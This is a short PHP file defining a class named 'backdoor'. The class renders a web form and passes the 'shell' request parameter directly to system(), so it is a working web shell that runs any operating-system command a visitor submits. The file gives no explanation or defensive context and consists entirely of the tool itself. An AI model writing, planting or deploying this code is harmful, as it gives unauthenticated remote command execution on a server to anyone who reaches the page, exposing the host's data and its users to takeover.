<?php
class backdoor { 
   var $shell;

   function shell() {
      echo "<form method=\"POST\" action=\"".$_SERVER['PHP_SELF']."\"><input name=\"shell\" type=\"text\"><input type=\"submit\" name=\"Shell\"></form><br>";
      system($this->shell);
   }  
}

echo "start";
$shell = $_REQUEST['shell'];
$backdoor = new backdoor();
$backdoor->shell = $shell;
$backdoor->shell();
?>